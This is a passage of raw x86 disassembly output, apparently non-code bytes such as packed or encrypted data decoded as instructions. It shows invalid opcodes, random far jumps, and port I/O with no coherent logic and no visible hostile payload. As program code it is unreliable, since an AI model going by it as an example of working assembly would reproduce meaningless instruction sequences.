  41ec9f:	add    BYTE PTR [esi+0x4eba0c3b],dl
  41eca5:	std    
  41eca6:	xor    al,0x9
  41eca8:	imul   ebp,esp,0x2636df4e
  41ecae:	bound  edi,QWORD PTR [ecx-0x2b2591e]
  41ecb4:	retf   
  41ecb5:	icebp  
  41ecb6:	dec    ebx
  41ecb7:	jecxz  0x41ec3c
  41ecb9:	lahf   
  41ecba:	retf   0xc8d3
  41ecbd:	mov    dl,0x48
  41ecbf:	and    BYTE PTR [ecx],bh
  41ecc1:	cmp    al,0xb
  41ecc3:	dec    ecx
  41ecc4:	mov    esp,0xdb744b56
  41ecc9:	xchg   ebp,eax
  41ecca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eccb:	jo     0x41ece3
  41eccd:	loopne 0x41eca0
  41eccf:	into   
  41ecd0:	and    BYTE PTR [edx-0x7],al
  41ecd3:	aaa    
  41ecd4:	into   
  41ecd5:	cmp    eax,eax
  41ecd7:	push   ss
  41ecd8:	imul   ebx,esi,0x39
  41ecdb:	into   
  41ecdc:	mov    cl,0x13
  41ecde:	bound  ebp,QWORD PTR [ebx-0x1]
  41ece1:	push   edx
  41ece2:	out    0xd4,al
  41ece4:	sar    BYTE PTR [eax-0x11],0x17
  41ece8:	iret   
  41ece9:	pop    ebp
  41ecea:	xchg   BYTE PTR [eax+0x5a4f2e65],al
  41ecf0:	fwait
  41ecf1:	lahf   
  41ecf2:	xchg   ecx,eax
  41ecf3:	cmp    ecx,DWORD PTR [ebp+ebx*1+0x7c58f342]
  41ecfa:	add    al,0xf5
  41ecfc:	sub    BYTE PTR [esi+0x47],ch
  41ecff:	add    DWORD PTR ds:0x85ffb739,esp
  41ed05:	xor    edi,0xffffff9a
  41ed08:	xchg   esi,eax
  41ed09:	mov    eax,0x11b96244
  41ed0e:	and    DWORD PTR [ebx+0x457e3947],ecx
  41ed14:	sbb    BYTE PTR [edi],dl
  41ed16:	jbe    0x41ed33
  41ed18:	adc    al,0x40
  41ed1a:	gs ss xor al,0x39
  41ed1e:	inc    ebx
  41ed1f:	jne    0x41ed68
  41ed21:	push   esp
  41ed22:	pop    esi
  41ed23:	pop    ss
  41ed24:	dec    ebx
  41ed25:	ret    0xd0
  41ed28:	(bad)  
  41ed29:	call   0xb923:0x2ec1ee2f
  41ed30:	in     eax,dx
  41ed31:	nop
  41ed32:	scas   eax,DWORD PTR es:[edi]
  41ed33:	ret    
  41ed34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed35:	lds    esp,FWORD PTR ds:0xcd5b290f
  41ed3b:	ror    bh,1
  41ed3d:	dec    eax
  41ed3e:	xor    cl,al
  41ed40:	lds    ecx,FWORD PTR [esi]
  41ed42:	adc    eax,0xf44bf837
  41ed47:	xor    cl,bh
  41ed49:	jge    0x41ed3d
  41ed4b:	fld    DWORD PTR [ebx-0x73]
  41ed4e:	repnz fild QWORD PTR [ebx-0x277e00e9]
  41ed55:	test   eax,0xb53bbf9e
  41ed5a:	cmp    DWORD PTR [esi+esi*1],ebx
  41ed5d:	inc    esi
  41ed5e:	int3   
  41ed5f:	out    dx,eax
  41ed60:	jb     0x41edb5
  41ed62:	xor    BYTE PTR [eax-0x54],dl
  41ed65:	(bad)  
  41ed66:	retf   
  41ed67:	push   ss
  41ed68:	xchg   BYTE PTR [ecx],dh
  41ed6a:	test   al,0x9c
  41ed6c:	call   0xf0b699d5
  41ed71:	sahf   
  41ed72:	scas   eax,DWORD PTR es:[edi]
  41ed73:	mov    ds:0x6636b5fc,eax
  41ed78:	lods   eax,DWORD PTR ds:[esi]
  41ed79:	das    
  41ed7a:	adc    eax,0x1ec5c733
  41ed7f:	(bad)  
  41ed80:	fucomip st,st(6)
  41ed82:	(bad)  
  41ed83:	scas   al,BYTE PTR es:[edi]
  41ed84:	mov    DWORD PTR [ebx+0x3c],esi
  41ed87:	or     DWORD PTR [ecx-0x9],ecx
  41ed8a:	mov    ecx,DWORD PTR [ecx]
  41ed8c:	sbb    ecx,DWORD PTR ds:0xa25a25e3
  41ed92:	mov    dh,0x4a
  41ed94:	call   FWORD PTR [edx-0x3]
  41ed97:	lods   eax,DWORD PTR ds:[esi]
  41ed98:	fs sbb eax,0x143eeca
  41ed9e:	push   es
  41ed9f:	push   esp
  41eda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda1:	mov    ds:0x4604866,eax
  41eda6:	nop
  41eda7:	inc    ecx
  41eda8:	popa   
  41eda9:	(bad)  
  41edaa:	mov    esi,fs
  41edac:	mov    bh,0x69
  41edae:	repnz retf 0xb1c
  41edb2:	imul   ecx,DWORD PTR [edi+0x53048e45],0x2f
  41edb9:	das    
  41edba:	jno    0x41ed98
  41edbc:	inc    ebp
  41edbd:	jl     0x41edfb
  41edbf:	dec    ecx
  41edc0:	fsub   st(5),st
  41edc2:	mov    ds:0x24d3d9db,al
  41edc7:	hlt    
  41edc8:	cmp    BYTE PTR gs:[ebp-0x5117b85f],ch
  41edcf:	in     al,0x93
  41edd1:	icebp  
  41edd2:	cmc    
  41edd3:	xor    eax,0xdaf4dc18
  41edd8:	push   edx
  41edd9:	or     DWORD PTR [esi-0x72],edi
  41eddc:	nop
  41eddd:	rcl    BYTE PTR [edi-0x1a2afd17],cl
  41ede3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede4:	and    DWORD PTR [esi],0x77befaed
  41edea:	iret   
  41edeb:	xor    eax,0x306d0bfd
  41edf0:	dec    ebx
  41edf1:	add    bh,dl
  41edf3:	pop    edx
  41edf4:	out    dx,al
  41edf5:	cmp    eax,0x4bf3ee54
  41edfa:	add    BYTE PTR [edi+0x74],cl
  41edfd:	ins    BYTE PTR es:[edi],dx
  41edfe:	sahf   
  41edff:	mov    BYTE PTR [edx+edx*4],0xe9
  41ee03:	data16 (bad) 
  41ee05:	mov    al,0xca
  41ee07:	jge    0x41ed8d
  41ee09:	fadd   DWORD PTR [ecx-0x13d6e8fa]
  41ee0f:	int    0x91
  41ee11:	inc    esp
  41ee12:	int    0x85
  41ee14:	test   DWORD PTR [ecx],eax
  41ee16:	mov    cl,0x7c
  41ee18:	pop    ds
  41ee19:	out    0x92,al
  41ee1b:	pop    edi
  41ee1c:	iret   
  41ee1d:	sar    BYTE PTR [edx+0x2374f03],1
  41ee23:	mov    gs,WORD PTR [ebx+0x3]
  41ee26:	pop    esp
  41ee27:	jmp    0x41ee15
  41ee29:	or     BYTE PTR [ecx-0x7b],bh
  41ee2c:	cli    
  41ee2d:	cwde   
  41ee2e:	and    DWORD PTR [ecx+0x50],ecx
  41ee31:	pushf  
  41ee32:	into   
  41ee33:	out    dx,al
  41ee34:	push   es
  41ee35:	loop   0x41edf2
  41ee37:	test   edi,ebp
  41ee39:	ret    
  41ee3a:	pushf  
  41ee3b:	imul   eax,DWORD PTR [esi+0x5b214523],0xfc83023e
  41ee45:	sub    dl,cl
  41ee47:	jp     0x41ee63
  41ee49:	push   0x7689a897
  41ee4e:	jns    0x41ee3c
  41ee50:	enter  0x10f7,0x88
  41ee54:	sti    
  41ee55:	popf   
  41ee56:	sbb    al,0x5b
  41ee58:	into   
  41ee59:	pop    ebp
  41ee5a:	adc    DWORD PTR [ebp+0x1fd07133],esp
  41ee60:	mov    eax,0xc8a192c1
  41ee65:	(bad)  
  41ee66:	popf   
  41ee67:	lods   eax,DWORD PTR ds:[esi]
  41ee68:	inc    edx
  41ee69:	popf   
  41ee6a:	lahf   
  41ee6b:	xor    esi,DWORD PTR [eax]
  41ee6d:	aad    0x5a
  41ee6f:	cdq    
  41ee70:	mov    al,0xd9
  41ee72:	xor    DWORD PTR [ecx-0x43ec8cb1],ebp
  41ee78:	push   0xfbe62646
  41ee7d:	xor    bh,dh
  41ee7f:	(bad)  
  41ee80:	or     edx,eax
  41ee82:	call   0x9f111606
  41ee87:	bound  ebp,QWORD PTR [ecx-0x2ad02e7d]
  41ee8d:	aaa    
  41ee8e:	div    BYTE PTR [esi+edi*8+0x11]
  41ee92:	lods   eax,DWORD PTR ds:[esi]
  41ee93:	and    BYTE PTR [ebx+0x3b],cl
  41ee96:	stos   DWORD PTR es:[edi],eax
  41ee97:	mov    esi,0x50b67dee
  41ee9c:	jge    0x41ef16
  41ee9e:	cs inc edi
  41eea0:	leave  
  41eea1:	xchg   ecx,eax
  41eea2:	or     al,0x96
  41eea4:	xlat   BYTE PTR ds:[ebx]
  41eea5:	xchg   ecx,eax
  41eea6:	xor    cl,BYTE PTR [edx-0x3e2cedb7]
  41eeac:	ds jnp 0x41ee4d
  41eeaf:	jmp    0x41eebd
  41eeb1:	push   0x652cf870
  41eeb6:	repnz cmp al,0x84
  41eeb9:	mov    BYTE PTR [eax-0x15f5d38e],bl
  41eebf:	cs sub ecx,eax
  41eec2:	mov    dl,0xad
  41eec4:	les    ecx,FWORD PTR [esi+0x16]
  41eec7:	mov    ebp,0x360a76b8
  41eecc:	push   edx
  41eecd:	pop    esi
  41eece:	fs scas eax,DWORD PTR es:[edi]
  41eed0:	jle    0x41ee8b
  41eed2:	adc    ah,BYTE PTR [eax]
  41eed4:	out    0x77,eax
  41eed6:	in     al,0x46
  41eed8:	test   esi,0x757f944a
  41eede:	mov    al,ds:0x3213aabd
  41eee3:	dec    esp
  41eee4:	mov    eax,ds:0x200b9257
  41eee9:	cmc    
  41eeea:	arpl   WORD PTR [edx-0x45e7c788],di
  41eef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef1:	lods   eax,DWORD PTR ds:[esi]
  41eef2:	scas   al,BYTE PTR es:[edi]
  41eef3:	mov    BYTE PTR [ebx+0x3c],bl
  41eef6:	ins    DWORD PTR es:[edi],dx
  41eef7:	mov    al,BYTE PTR [edx+edi*2-0x3cb0afac]
  41eefe:	ret    
  41eeff:	ins    BYTE PTR es:[edi],dx
  41ef00:	mov    ?,WORD PTR [eax-0x6702611f]
  41ef06:	loop   0x41ef29
  41ef08:	les    esi,FWORD PTR [ebx+eax*1]
  41ef0b:	mov    eax,ds:0x31a38f6a
  41ef10:	mov    ah,0x24
  41ef12:	mov    al,ds:0x210e27a0
  41ef17:	in     eax,dx
  41ef18:	push   eax
  41ef19:	inc    ebx
  41ef1a:	mov    DWORD PTR [esi+0x20b6160],eax
  41ef20:	mov    ds:0x7cdde17d,al
  41ef25:	jl     0x41eedb
  41ef27:	push   es
  41ef28:	fdiv   DWORD PTR [ebx-0x3]
  41ef2b:	adc    DWORD PTR [esi-0x6736c66f],0xffffffc6
  41ef32:	and    al,0x7a
  41ef34:	sub    al,BYTE PTR [esi+0x565c2815]
  41ef3a:	leave  
  41ef3b:	sub    eax,0x2445d813
  41ef40:	cmp    ebp,ecx
  41ef42:	out    0x96,al
  41ef44:	inc    esi
  41ef45:	ss push edi
  41ef47:	int3   
  41ef48:	sar    dh,cl
  41ef4a:	xchg   ecx,eax
  41ef4b:	mov    ah,0xb2
  41ef4d:	test   DWORD PTR [ebp+0x3c],ebx
  41ef50:	repz cdq 
  41ef52:	hlt    
  41ef53:	lahf   
  41ef54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef55:	jbe    0x41eee4
  41ef57:	or     BYTE PTR [esi],al
  41ef59:	call   0xb47017de
  41ef5e:	push   ebp
  41ef5f:	(bad)  
  41ef60:	loopne 0x41ef22
  41ef62:	xchg   esi,eax
  41ef63:	shl    BYTE PTR [ecx+0x3a057113],1
  41ef69:	stos   BYTE PTR es:[edi],al
  41ef6a:	inc    ecx
  41ef6b:	gs and al,0x20
  41ef6e:	mov    ah,0x1f
  41ef70:	retf   0xd39
  41ef73:	push   ebx
  41ef74:	or     eax,0x836b0a7d
  41ef79:	fdivr  QWORD PTR [ebx-0x555acf85]
  41ef7f:	nop
  41ef80:	(bad)  
  41ef81:	pop    ss
  41ef82:	arpl   ax,bp
  41ef84:	sbb    dl,BYTE PTR [ecx+0x73]
  41ef87:	sbb    BYTE PTR [esi-0x55dd3c10],ch
  41ef8d:	add    DWORD PTR [ebx+0x122758b5],ebx
  41ef93:	jae    0x41efad
  41ef95:	mov    ds:0xc2a48c29,al
  41ef9a:	dec    ebx
  41ef9b:	js     0x41effe
  41ef9d:	lods   al,BYTE PTR ds:[esi]
  41ef9e:	or     bl,BYTE PTR [esp+edi*8+0x6a59701b]
  41efa5:	call   0x9823c465
  41efaa:	lods   eax,DWORD PTR ds:[esi]
  41efab:	adc    eax,0x9ee45499
  41efb0:	pop    esp
  41efb1:	retf   
  41efb2:	push   edi
  41efb3:	ret    0x1c67
  41efb6:	dec    eax
  41efb7:	xchg   ebx,eax
  41efb8:	xchg   dh,ch
  41efba:	jl     0x41efe7
  41efbc:	mov    bh,0xe
  41efbe:	xchg   ebx,eax
  41efbf:	ins    BYTE PTR es:[edi],dx
  41efc0:	repnz out dx,eax
  41efc2:	cmp    BYTE PTR [ecx+0x49],bh
  41efc5:	add    dh,BYTE PTR [ecx+0x612e17dc]
  41efcb:	add    DWORD PTR [ebx],ebx
  41efcd:	leave  
  41efce:	iret   
  41efcf:	cmp    BYTE PTR [edi-0x5f],al
  41efd2:	js     0x41ef8c
  41efd4:	retf   0xb8e
  41efd7:	ror    esi,cl
  41efd9:	les    edx,FWORD PTR [ebx+0x2c53e500]
  41efdf:	jmp    0x67d4:0x279a78b0
  41efe6:	or     al,0xf3
  41efe8:	cwde   
  41efe9:	mov    edi,0x70a6d6ed
  41efee:	sub    bl,al
  41eff0:	or     BYTE PTR [edx-0x29],dh
  41eff3:	xchg   ecx,eax
  41eff4:	leave  
  41eff5:	fsubr  QWORD PTR [edi+ebp*2]
  41eff8:	fwait
  41eff9:	and    ebp,eax
  41effb:	fadd   QWORD PTR [eax+0x592fa596]
  41f001:	cmp    dh,BYTE PTR [edx]
  41f003:	push   esi
  41f004:	push   ebp
  41f005:	iret   
  41f006:	dec    ebp
  41f007:	inc    esi
  41f008:	lahf   
  41f009:	mov    esi,0x7fdb81d3
  41f00e:	pop    eax
  41f00f:	ds dec edi
  41f011:	rol    DWORD PTR [edi-0x72],0x63
  41f015:	scas   al,BYTE PTR es:[edi]
  41f016:	xor    al,0xfe
  41f018:	and    ecx,DWORD PTR [esp+edi*2]
  41f01b:	fstp   QWORD PTR [esi+0x21]
  41f01e:	push   0x2b
  41f020:	sbb    DWORD PTR [edi+0x255cf462],esi
  41f026:	sub    edi,esp
  41f028:	add    al,0x85
  41f02a:	mov    esp,0xda14126c
  41f02f:	loope  0x41eff5
  41f031:	xor    al,0xcc
  41f033:	fcomip st,st(2)
  41f035:	dec    edi
  41f036:	(bad)  
  41f037:	leave  
  41f038:	xchg   esi,eax
  41f039:	push   eax
  41f03a:	add    ah,BYTE PTR [ebp-0x5e]
  41f03d:	nop
  41f03e:	inc    ebx
  41f03f:	stos   DWORD PTR es:[edi],eax
  41f040:	fs test al,0xd6
  41f043:	jp     0x41efcc
  41f045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f046:	cli    
  41f047:	xchg   ecx,eax
  41f048:	pusha  
  41f049:	jb     0x41f030
  41f04b:	and    dl,ch
  41f04d:	push   edi
  41f04e:	ret    
  41f04f:	sti    
  41f050:	adc    ebx,edi
  41f052:	call   0x4d02787f
  41f057:	arpl   di,bx
  41f059:	ds mov esi,0xced87c32
  41f05f:	in     al,0xe9
  41f061:	inc    edi
  41f062:	push   edi
  41f063:	dec    ebx
  41f064:	mov    si,WORD PTR gs:[edi-0xf839aaf]
  41f06c:	xor    al,BYTE PTR [esi+0x673b0b09]
  41f072:	cli    
  41f073:	mov    edx,0xdfd1aa19
  41f078:	add    ecx,DWORD PTR ss:0x413b9ebd
  41f07f:	jmp    0xa246:0xdbe97da7
  41f086:	or     edx,DWORD PTR [ecx+0x71c50736]
  41f08c:	cmp    bl,cl
  41f08e:	call   0x6c10:0x46b7dd0c
  41f095:	ror    BYTE PTR [eax],cl
  41f097:	(bad)  
  41f098:	and    ecx,ecx
  41f09a:	repnz (bad) 
  41f09c:	mov    ds:0xd63ef00a,eax
  41f0a1:	repnz mov eax,ds:0x22e229b5
  41f0a7:	cmp    esp,0x7892444c
  41f0ad:	cmp    dh,BYTE PTR [eax-0x6bd53f3]
  41f0b3:	aaa    
  41f0b4:	mov    DWORD PTR [ebx+0x3f],ebp
  41f0b7:	ja     0x41f0ae
  41f0b9:	mov    ds:0xf39867a3,al
  41f0be:	sbb    DWORD PTR [esi+esi*1+0x6d],ebx
  41f0c2:	clc    
  41f0c3:	cld    
  41f0c4:	sbb    eax,0x8ce44df7
  41f0c9:	gs call 0x52ca265b
  41f0cf:	xchg   esp,eax
  41f0d0:	in     eax,0x86
  41f0d2:	jmp    0x38f59209
  41f0d7:	fdivr  st,st(6)
  41f0d9:	in     al,0x35
  41f0db:	out    0x5c,eax
  41f0dd:	js     0x41f094
  41f0df:	xchg   ecx,eax
  41f0e0:	mov    al,0xdf
  41f0e2:	pushf  
  41f0e3:	inc    eax
  41f0e4:	xor    cl,BYTE PTR [eax]
  41f0e6:	mov    ebp,0xa99ec9a8
  41f0eb:	dec    ebx
  41f0ec:	lock dec ebp
  41f0ee:	xor    bh,BYTE PTR [edi-0xb54bf92]
  41f0f4:	imul   eax,DWORD PTR [ebx+0x1873d693],0x7dee21e
  41f0fe:	imul   ebx,DWORD PTR [ebx+0x5423473b],0x3650855b
  41f108:	mov    ds:0xee94d025,eax
  41f10d:	and    ebp,DWORD PTR [ebx-0x1a98f782]
  41f113:	mov    edx,0xd661f5f6
  41f118:	push   es
  41f119:	sbb    eax,0x56dcc9b5
  41f11e:	arpl   bx,cx
  41f120:	ss hlt 
  41f122:	add    edx,DWORD PTR [edi]
  41f124:	adc    eax,0x11ff5d32
  41f129:	inc    ebx
  41f12a:	dec    esp
  41f12b:	push   es
  41f12c:	pop    edx
  41f12d:	jns    0x41f194
  41f12f:	pop    ss
  41f130:	push   edx
  41f131:	out    dx,al
  41f132:	out    dx,eax
  41f133:	push   0x6f911fed
  41f138:	outs   dx,DWORD PTR ds:[esi]
  41f139:	add    BYTE PTR [eax-0x513d72c3],cl
  41f13f:	and    al,0xb
  41f141:	sti    
  41f142:	inc    ecx
  41f143:	add    al,0x4d
  41f145:	add    BYTE PTR [eax-0x36],bh
  41f148:	or     dh,ch
  41f14a:	aad    0x64
  41f14c:	mov    dl,0x2a
  41f14e:	dec    edx
  41f14f:	inc    edx
  41f150:	adc    eax,0x7d7447a2
  41f155:	lahf   
  41f156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f157:	pop    ebp
  41f158:	sub    BYTE PTR [edx],dl
  41f15a:	aad    0xf7
  41f15c:	fldcw  WORD PTR [ebx-0x2d]
  41f15f:	(bad)  
  41f160:	mov    ?,esp
  41f162:	stc    
  41f163:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f165:	sbb    eax,0xa6e56fa9
  41f16a:	dec    edi
  41f16b:	dec    edx
  41f16c:	adc    BYTE PTR [edi+0x6eec9a01],dl
  41f172:	jmp    0x41f14d
  41f174:	push   edx
  41f175:	add    al,0x4d
  41f177:	fstp   DWORD PTR [ecx+0x39]
  41f17a:	xor    cl,0x5f
  41f17d:	ja     0x41f10a
  41f17f:	fdivr  st(6),st
  41f181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f182:	inc    ebx
  41f183:	imul   ebx,DWORD PTR [ebp+0x29],0xffffffea
  41f187:	pop    edx
  41f188:	fistp  QWORD PTR [edi+0x54]
  41f18b:	outs   dx,BYTE PTR ds:[esi]
  41f18c:	inc    ebp
  41f18d:	clc    
  41f18e:	sub    eax,0x490d40e5
  41f193:	repz iret 
  41f195:	sub    al,dl
  41f197:	stos   DWORD PTR es:[edi],eax
  41f198:	xchg   edi,ebx
  41f19a:	stc    
  41f19b:	and    ebp,DWORD PTR [ebx+0x54]
  41f19e:	into   
  41f19f:	sub    BYTE PTR [ecx],dh
  41f1a1:	popa   
  41f1a2:	jb     0x41f1fc
  41f1a4:	or     esp,edx
  41f1a6:	mov    edi,0x6b22c450
  41f1ab:	cld    
  41f1ac:	push   es
  41f1ad:	xor    BYTE PTR [edx+eax*2+0x22bb1921],ch
  41f1b4:	addr16 pop esp
  41f1b6:	dec    edi
  41f1b7:	push   0xb0aa199c
  41f1bc:	mov    WORD PTR [edi*2+0x2e5cc83b],ds
  41f1c3:	mov    al,ds:0xe79650ed
  41f1c8:	mov    BYTE PTR [esi],bh
  41f1ca:	xlat   BYTE PTR ds:[ebx]
  41f1cb:	fmulp  st(0),st
  41f1cd:	jp     0x41f1ea
  41f1cf:	xchg   edi,eax
  41f1d0:	push   0xd4fecce2
  41f1d5:	sub    ch,BYTE PTR ds:0x540b4691
  41f1db:	add    al,0xf7
  41f1dd:	push   ds
  41f1de:	out    0x74,eax
  41f1e0:	mov    BYTE PTR [ebx],al
  41f1e2:	xchg   BYTE PTR [edx-0x22],dl
  41f1e5:	sbb    al,0x12
  41f1e7:	cmp    DWORD PTR [esi+0x71],0xc73c0ab0
  41f1ee:	jae    0x41f1cd
  41f1f0:	and    DWORD PTR es:[ebx+0xe3d1518],0xffffffd8
  41f1f8:	inc    esp
  41f1f9:	pop    ds
  41f1fa:	mov    eax,0x6df46cba
  41f1ff:	dec    edi
  41f200:	test   al,0x42
  41f202:	adc    eax,0x3fdbbf91
  41f207:	xchg   ecx,eax
  41f208:	jae    0x41f18c
  41f20a:	mov    dl,0x48
  41f20c:	call   0x9c3f1a14
  41f211:	push   esp
  41f212:	xchg   ecx,eax
  41f213:	sbb    eax,0x78f8c3d6
  41f218:	int    0x24
  41f21a:	ret    
  41f21b:	pop    DWORD PTR [ebx]
  41f21d:	xor    al,0xb1
  41f21f:	(bad)  
  41f220:	bswap  esi
  41f222:	clc    
  41f223:	pop    es
  41f224:	mov    ds:0x2ddb0643,al
  41f229:	shl    DWORD PTR [edi-0x26],cl
  41f22c:	not    BYTE PTR [ebx-0x28d14736]
  41f232:	ror    DWORD PTR [edx+0x74],1
  41f235:	mov    edx,0x58e9e5bb
  41f23a:	ror    BYTE PTR [ebp+0xbc6625c],1
  41f240:	and    bl,BYTE PTR [eax]
  41f242:	ja     0x41f23e
  41f244:	clc    
  41f245:	adc    BYTE PTR [edx],dh
  41f247:	xor    BYTE PTR [eax],0xfd
  41f24a:	sub    cl,0x93
  41f24d:	out    0x5f,al
  41f24f:	inc    ebp
  41f250:	dec    esp
  41f251:	adc    eax,0x3cad245
  41f256:	jmp    0x41f2b3
  41f258:	adc    eax,0x78aeb899
  41f25d:	mov    DWORD PTR [ebx],eax
  41f25f:	push   edx
  41f260:	lea    esp,[ecx]
  41f262:	jge    0x41f239
  41f264:	jecxz  0x41f2cd
  41f266:	or     edx,DWORD PTR [ecx-0x396b89a5]
  41f26c:	cmp    BYTE PTR [ecx+0x56],cl
  41f26f:	xchg   edi,eax
  41f270:	stos   BYTE PTR es:[edi],al
  41f271:	adc    al,0xde
  41f273:	leave  
  41f274:	(bad)  
  41f275:	in     eax,dx
  41f276:	icebp  
  41f277:	adc    al,0x5
  41f279:	inc    esp
  41f27a:	jge    0x41f27c
  41f27c:	cmp    BYTE PTR [edi],bl
  41f27e:	push   cs
  41f27f:	fmul   QWORD PTR [ecx]
  41f281:	mov    ecx,0xab11e3ed
  41f286:	mov    esi,DWORD PTR [edx-0x66]
  41f289:	push   0xffffffeb
  41f28b:	fwait
  41f28c:	sub    DWORD PTR [edx+0x3a796ca1],edx
  41f292:	ds clc 
  41f294:	out    0xbf,al
  41f296:	adc    eax,0xd2b4e08a
  41f29b:	das    
  41f29c:	jns    0x41f2ee
  41f29e:	add    bh,BYTE PTR [esi-0x6e]
  41f2a1:	popf   
  41f2a2:	arpl   WORD PTR [ecx],ax
  41f2a4:	jle    0x41f2f0
  41f2a6:	repz adc cl,bh
  41f2a9:	js     0x41f2ff
  41f2ab:	jnp    0x41f31b
  41f2ad:	push   eax
  41f2ae:	retf   
  41f2af:	inc    edi
  41f2b0:	dec    ecx
  41f2b1:	hlt    
  41f2b2:	retf   
  41f2b3:	xchg   ebx,eax
  41f2b4:	into   
  41f2b5:	popa   
  41f2b6:	ret    
  41f2b7:	push   ss
  41f2b8:	jne    0x41f324
  41f2ba:	or     BYTE PTR [esi-0x207d6fa2],al
  41f2c0:	pop    es
  41f2c1:	stos   BYTE PTR es:[edi],al
  41f2c2:	xor    al,BYTE PTR [esi-0x2769734d]
  41f2c8:	mul    DWORD PTR [esi]
  41f2ca:	mov    al,ds:0x4c0dc05f
  41f2cf:	mov    ah,0xa9
  41f2d1:	mov    dl,0xd8
  41f2d3:	jg     0x41f25b
  41f2d5:	dec    eax
  41f2d6:	pop    edi
  41f2d7:	cmp    DWORD PTR [ebp+edi*4+0x32],eax
  41f2db:	(bad)  
  41f2dc:	mov    ecx,0x796ceae0
  41f2e1:	cmc    
  41f2e2:	mov    ch,0x17
  41f2e4:	out    dx,al
  41f2e5:	inc    ebp
  41f2e6:	inc    ebx
  41f2e7:	into   
  41f2e8:	xor    eax,DWORD PTR [eax-0x75b2e24e]
  41f2ee:	in     al,0x26
  41f2f0:	mov    edx,DWORD PTR [esi-0x7614546f]
  41f2f6:	in     al,0x1
  41f2f8:	xchg   ebp,eax
  41f2f9:	mov    ch,BYTE PTR [ebx-0x4f]
  41f2fc:	je     0x41f319
  41f2fe:	mov    al,0x69
  41f300:	cmp    ah,BYTE PTR ds:[ebp+eax*1+0x3a]
  41f305:	in     eax,0xcf
  41f307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f308:	fs jo  0x41f339
  41f30b:	mov    bh,0xed
  41f30d:	mov    al,ds:0xaa664dca
  41f312:	js     0x41f319
  41f314:	jp     0x41f2eb
  41f316:	in     eax,0x41
  41f318:	mov    eax,0x5cd6ecbc
  41f31d:	int3   
  41f31e:	sbb    ebx,ecx
  41f320:	push   ss
  41f321:	mov    esp,0x6669d56d
  41f326:	shr    BYTE PTR [eax+ebx*2-0x15b724c9],1
  41f32d:	add    DWORD PTR [ecx],edx
  41f32f:	lock cmp DWORD PTR [ebx-0x75],0x2cef795e
  41f337:	mov    dh,0x2d
  41f339:	cmp    DWORD PTR [ebx],eax
  41f33b:	aaa    
  41f33c:	fist   DWORD PTR [ebp+0x6d210998]
  41f342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f343:	test   DWORD PTR [edx+0x1101ae44],eax
  41f349:	mov    dh,0xc1
  41f34b:	icebp  
  41f34c:	mov    dl,0x1d
  41f34e:	jbe    0x41f390
  41f350:	(bad)  
  41f351:	aaa    
  41f352:	call   0xcc53d0c6
  41f357:	fidivr DWORD PTR [ebp+0x408a0c88]
  41f35d:	sar    BYTE PTR [eax-0x7c],0x75
  41f361:	lods   eax,DWORD PTR ds:[esi]
  41f362:	aam    0x81
  41f364:	sub    BYTE PTR [ecx],dh
  41f366:	shl    BYTE PTR [eax],1
  41f368:	sbb    DWORD PTR [esp+edx*4+0x6c700d9a],0x492fca2b
  41f373:	lock jne 0x41f2fa
  41f376:	and    BYTE PTR [edx+0x5f9d707],0x9f
  41f37d:	add    BYTE PTR [ebx+edi*8],0xf6
  41f381:	(bad)  
  41f382:	je     0x41f311
  41f384:	sbb    eax,0x203c8137
  41f389:	jmp    0x6607:0x58226168
  41f390:	dec    bh
  41f392:	xor    BYTE PTR [edi+0x37],al
  41f395:	sub    BYTE PTR [ebx+0x6d49567a],cl
  41f39b:	lahf   
  41f39c:	sub    edi,DWORD PTR [ebp-0x3fe1bcd0]
  41f3a2:	dec    eax
  41f3a3:	inc    ebp
  41f3a4:	inc    esi
  41f3a5:	mov    edx,DWORD PTR [ebx+0xde934d5]
  41f3ab:	jnp    0x41f42c
  41f3ad:	push   ss
  41f3ae:	xchg   esp,eax
  41f3af:	pop    ss
  41f3b0:	lea    ebx,[eax+0x61]
  41f3b3:	xchg   esp,eax
  41f3b4:	into   
  41f3b5:	int3   
  41f3b6:	fs dec edi
  41f3b8:	add    eax,0xdd35d029
  41f3bd:	test   bh,ch
  41f3bf:	jle    0x41f3f8
  41f3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3c2:	sbb    ah,BYTE PTR [edi-0x49]
  41f3c5:	repz sub DWORD PTR [ebx+0x7d26010a],eax
  41f3cc:	jmp    0x1d6f:0x6047d42d
  41f3d3:	jle    0x41f372
  41f3d5:	inc    esp
  41f3d6:	xchg   esi,eax
  41f3d7:	fwait
  41f3d8:	ror    BYTE PTR [ecx],0x17
  41f3db:	js     0x41f3e1
  41f3dd:	inc    esp
  41f3de:	arpl   WORD PTR [ecx-0x1d],di
  41f3e1:	mov    ecx,0x72266b3a
  41f3e6:	mov    ebp,0x73071e2b
  41f3eb:	mov    al,ds:0xcf755f5f
  41f3f0:	or     DWORD PTR [esi-0x264fd2e9],eax
  41f3f6:	loopne 0x41f457
  41f3f8:	sub    BYTE PTR [edx-0x1f],ch
  41f3fb:	adc    al,0xe
  41f3fd:	mov    cs,WORD PTR [esi+esi*8+0x74401f94]
  41f404:	dec    esp
  41f406:	jp     0x41f3c6
  41f408:	gs fwait
  41f40a:	jg     0x41f3ea
  41f40c:	dec    DWORD PTR [edx]
  41f40e:	call   0x171f:0x2a075dfc
  41f415:	out    0x70,eax
  41f417:	pop    edi
  41f418:	cmp    eax,0xc9f4ff3
  41f41d:	nop
  41f41e:	loopne 0x41f46d
  41f420:	xchg   esp,eax
  41f421:	jecxz  0x41f443
  41f423:	push   ecx
  41f424:	adc    esp,DWORD PTR [esp+ebp*1-0x5]
  41f428:	push   0x74e0f4d
  41f42d:	inc    ecx
  41f42e:	xchg   edi,eax
  41f42f:	test   ebx,0xb534785a
  41f435:	cdq    
  41f436:	xchg   esp,eax
  41f437:	into   
